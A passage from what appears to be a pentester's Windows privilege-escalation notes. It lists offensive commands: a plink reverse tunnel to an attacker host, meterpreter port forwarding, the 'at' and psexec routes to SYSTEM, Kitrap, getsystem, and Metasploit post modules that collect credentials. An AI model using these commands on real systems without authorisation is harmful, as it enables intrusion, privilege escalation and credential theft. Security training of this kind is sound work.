plink.exe -l root -pw mysecretpassword 192.168.0.101 -R 8080:127.0.0.1:8080

# Port forward using meterpreter
portfwd add -l &lt;attacker port&gt; -p &lt;victim port&gt; -r &lt;victim ip&gt;
portfwd add -l 3306 -p 3306 -r 192.168.1.101
</code></pre>
<p>So how should we interpret the netstat output?</p>
<p><strong>Local address 0.0.0.0</strong><br />
Local address 0.0.0.0 means that the service is listening on all interfaces. This means that it can receive a connection from the network card, from the loopback interface or any other interface. This means that anyone can connect to it.</p>
<p><strong>Local address 127.0.0.1</strong><br />
Local address 127.0.0.1 means that the service is only listening for connection from the your PC. Not from the internet or anywhere else. <strong>This is interesting to us!</strong></p>
<p><strong>Local address 192.168.1.9</strong><br />
Local address 192.168.1.9 means that the service is only listening for connections from the local network. So someone in the local network can connect to it, but not someone from the internet. <strong>This is also interesting to us!</strong></p>
<h2 id="vulnerable-drivers">Vulnerable Drivers<a class="headerlink" href="#vulnerable-drivers" title="Permanent link">#</a></h2>
<p>Some driver might be vulnerable. I don't know how to check this in an efficient way.</p>
<pre><code># List all drivers
driverquery
</code></pre>
<h2 id="hot-potato">Hot potato<a class="headerlink" href="#hot-potato" title="Permanent link">#</a></h2>
<p>Never tried.
https://foxglovesecurity.com/2016/01/16/hot-potato/</p>
<h2 id="scheduled-tasks-only-works-on-windows-2000xp2003">Scheduled Tasks - Only works on Windows 2000/xp/2003<a class="headerlink" href="#scheduled-tasks-only-works-on-windows-2000xp2003" title="Permanent link">#</a></h2>
<p>Here we are looking for tasks that are run by a privileged user, and run a binary that we can overwrite.</p>
<pre><code>schtasks /query /fo LIST /v
</code></pre>
<p>This might produce a huge amount of text. I have not been able to figure out how to just output the relevant strings with <code>findstr</code>. So if you know a better way please notify me. As for now I just copy-paste the text and past it into my linux-terminal.</p>
<p>Yeah I know this ain't pretty, but it works. You can of course change the name SYSTEM to another privileged user.</p>
<pre><code>cat schtask.txt | grep &quot;SYSTEM\|Task To Run&quot; | grep -B 1 SYSTEM
</code></pre>
<h2 id="escalate-to-system-from-administrator">Escalate to SYSTEM from Administrator<a class="headerlink" href="#escalate-to-system-from-administrator" title="Permanent link">#</a></h2>
<h3 id="on-windows-xp-and-older">On Windows XP and Older<a class="headerlink" href="#on-windows-xp-and-older" title="Permanent link">#</a></h3>
<p>If you have a GUI with a user that is included in Administrators group you first need to open up <code>cmd.exe</code> for the administrator. If you open up the cmd that is in Accessories it will be opened up as a normal user. And if you rightclick and do <code>Run as Administrator</code> you might need to know the Administrators password. Which you might not know. So instead you open up the cmd from <code>c:\windows\system32\cmd.exe</code>. This will give you a cmd with Administrators rights.</p>
<p>From here we want to become SYSTEM user. To do this we run:</p>
<p>First we check what time it is on the local machine:</p>
<pre><code>time

# Now we set the time we want the system CMD to start. Probably one minuter after the time.
at 01:23 /interactive cmd.exe
</code></pre>
<p>And then the cmd with SYSTEM privs pops up.</p>
<h3 id="vista-and-newer">Vista and Newer<a class="headerlink" href="#vista-and-newer" title="Permanent link">#</a></h3>
<p>You first need to upload PsExec.exe and then you run:</p>
<pre><code>psexec -i -s cmd.exe
</code></pre>
<h3 id="kitrap">Kitrap<a class="headerlink" href="#kitrap" title="Permanent link">#</a></h3>
<p>On some machines the <code>at 20:20</code> trick does not work. It never works on Windows 2003 for example. Instead you can use Kitrap. Upload both files and execute <code>vdmaillowed.exe</code>. I think it only works with GUI.</p>
<pre><code>vdmallowed.exe
vdmexploit.dll
</code></pre>
<h3 id="using-metasploit_1">Using Metasploit<a class="headerlink" href="#using-metasploit_1" title="Permanent link">#</a></h3>
<p>So if you have a metasploit meterpreter session going you can run <code>getsystem</code>.</p>
<h2 id="post-modules">Post modules<a class="headerlink" href="#post-modules" title="Permanent link">#</a></h2>
<p>Some interesting metasploit post-modules</p>
<p>First you need to background the meterpreter shell and then you just run the post modules.<br />
You can also try some different post modules.</p>
<pre><code>use exploit/windows/local/service_permissions

post/windows/gather/credentials/gpp

run post/windows/gather/credential_collector 

run post/multi/recon/local_exploit_suggester

run post/windows/gather/enum_shares

run post/windows/gather/enum_snmp

run post/windows/gather/enum_applications

run post/windows/gather/enum_logged_on_users

run post/windows/gather/checkvm
</code></pre>
<h2 id="references">References<a class="headerlink" href="#references" title="Permanent link">#</a></h2>
<p><a href="http://travisaltman.com/windows-privilege-escalation-via-weak-service-permissions/">http://travisaltman.com/windows-privilege-escalation-via-weak-service-permissions/</a><br />
<a href="http://www.fuzzysecurity.com/tutorials/16.html">http://www.fuzzysecurity.com/tutorials/16.html</a><br />
<a href="https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/">https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/</a><br />
<a href="http://it-ovid.blogspot.cl/2012/02/windows-privilege-escalation.html">http://it-ovid.blogspot.cl/2012/02/windows-privilege-escalation.html</a><br />
<a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a><br />
<a href="http://bernardodamele.blogspot.cl/2011/12/dump-windows-password-hashes.html">http://bernardodamele.blogspot.cl/2011/12/dump-windows-password-hashes.html</a><br />
<a href="https://www.youtube.com/watch?v=kMG8IsCohHA&amp;feature=youtu.be">https://www.youtube.com/watch?v=kMG8IsCohHA&amp;feature=youtu.be</a><br />
<a href="https://www.youtube.com/watch?v=PC_iMqiuIRQ">https://www.youtube.com/watch?v=PC_iMqiuIRQ</a><br />
<a href="http://www.harmj0y.net/blog/powershell/powerup-a-usage-guide/">http://www.harmj0y.net/blog/powershell/powerup-a-usage-guide/</a><br />
<a href="https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp">https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp</a><br />
<a href="http://pwnwiki.io/#!privesc/windows/index.md">http://pwnwiki.io/#!privesc/windows/index.md</a></p>





                
              </article>
            </div>
          
          
        </div>
        
      </main>
      
        <footer class="md-footer">
  
    
    <nav class="md-footer__inner md-grid" aria-label="Footer" >
      
        
        <a href="../../initial_access/wpad_spoofing/" class="md-footer__link md-footer__link--prev" aria-label="Previous: WPAD Spoofing" rel="prev">
          <div class="md-footer__button md-icon">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
          </div>
          <div class="md-footer__title">
            <div class="md-ellipsis">
              <span class="md-footer__direction">
                Previous
              </span>
              WPAD Spoofing
            </div>
          </div>
        </a>
      
      
        
        <a href="../shutdown_windows_defender/" class="md-footer__link md-footer__link--next" aria-label="Next: Disable Windows Defender" rel="next">
          <div class="md-footer__title">
            <div class="md-ellipsis">
              <span class="md-footer__direction">
                Next
              </span>
              Disable Windows Defender
            </div>
          </div>
          <div class="md-footer__button md-icon">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4Z"/></svg>
          </div>
        </a>
      
    </nav>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    <script id="__config" type="application/json">{"base": "../../..", "features": [], "search": "../../../assets/javascripts/workers/search.5bf1dace.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version.title": "Select version"}, "version": "v1.0.0"}</script>
    
    
      <script src="../../../assets/javascripts/bundle.37e9125f.min.js"></script>
      
    
  </body>
</html>